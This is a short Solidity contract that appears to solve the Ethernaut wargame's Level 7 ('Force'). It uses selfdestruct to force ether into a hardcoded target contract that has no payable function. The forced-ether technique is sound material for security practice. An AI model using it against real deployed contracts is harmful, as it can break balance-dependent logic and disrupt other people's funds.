//SPDX-License-identifier: MIT

pragma solidity ^0.8.0;

contract EthernautLevel7 {
    address payable forceContractAddress =
        payable(0xac313c75c4f39a98C7De019aCD4B8c725348af61);
    address public owner;

    //constructor initialized with some amount as wei which is then sent to Ethernaut Level 7 Force contract using selfdestruct
    constructor(address _owner) public payable {
        owner = _owner;
    }

    function selfDestruct() public {
        selfdestruct(forceContractAddress);
    }
}
